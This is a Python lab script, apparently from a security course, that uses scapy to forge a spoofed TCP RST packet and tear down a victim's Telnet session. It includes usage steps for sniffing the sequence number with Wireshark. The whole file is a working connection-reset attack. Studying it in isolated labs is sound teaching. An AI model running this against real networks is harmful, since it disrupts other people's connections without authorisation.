#!/usr/bin/env python3
"""
TCP RST Attack — TCP/IP Attack Lab
====================================
Terminates a live TCP connection by forging a RST packet with
a sequence number in the receiver's current window.

Attack prerequisites (obtained via Wireshark):
  - Source IP of the connection to kill
  - Source & Destination ports
  - Current sequence number (within the receiver's window)

Usage:
    1. Use Wireshark to sniff the target Telnet session
    2. Extract: src_ip, dst_ip, src_port, dst_port, seq_number
    3. Update the variables below
    4. sudo python3 tcprst.py

Why it works:
    TCP validates RST packets only by checking that the sequence
    number falls within the advertised receive window. There is no
    cryptographic authentication of the RST sender — any on-path
    attacker can forge an accepted RST.

WARNING: For educational use in isolated lab environments only.
"""

from scapy.all import IP, TCP, send, ls

# ── Values extracted from Wireshark live capture ──────────────────────
# Sniff the active connection and update these before running.
#
# In Wireshark, select a packet FROM the server (10.9.0.6 → 10.9.0.5)
# and read:
#   "Transmission Control Protocol, Src Port: X, Dst Port: Y, Seq: Z"

SRC_IP    = "10.9.0.6"     # Spoofed as server (so client receives RST)
DST_IP    = "10.9.0.5"     # Victim
SRC_PORT  = 23             # Telnet server port
DST_PORT  = 38462          # Client's ephemeral port (from Wireshark)
SEQ_NUM   = 2261858733     # Must be within victim's receive window
# ──────────────────────────────────────────────────────────────────────

print("[*] Crafting TCP RST packet...")
print(f"    {SRC_IP}:{SRC_PORT}  →  {DST_IP}:{DST_PORT}")
print(f"    RST flag | SEQ = {SEQ_NUM}\n")

ip  = IP(src=SRC_IP, dst=DST_IP)
tcp = TCP(sport=SRC_PORT, dport=DST_PORT, flags="R", seq=SEQ_NUM)
pkt = ip / tcp

print("Sending RESET Packet!!!!!\n")
ls(pkt)   # Print full packet structure for verification

send(pkt, verbose=0)
print("\n[✔] RST packet sent — target session should be terminated.")
